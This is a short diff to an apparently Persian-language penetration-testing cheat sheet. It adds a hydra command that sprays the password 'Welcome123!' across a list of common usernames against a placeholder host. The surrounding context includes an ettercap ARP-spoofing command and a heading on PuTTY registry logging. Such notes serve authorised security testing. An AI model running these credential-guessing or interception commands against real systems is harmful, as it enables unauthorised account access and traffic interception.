@@ -407,6 +407,13 @@ Must know the VPN group name a~d pre-shared key;
    ettercap -T -M arp II II
 ```
 
+### حدس نام کاربری با hydra
+
+```text
+hydra -L ~/seclists/Usernames/Names/femalenames-usa-top1000.txt -p Welcome123! IP PROTOCOL
+```
+
+
 ## نرم افزار Putty
 
 ### کلید رجیستری برای گزارش گیری از هر عملیاتی توسط putty \(حتی دستورات و خروجی ها\)
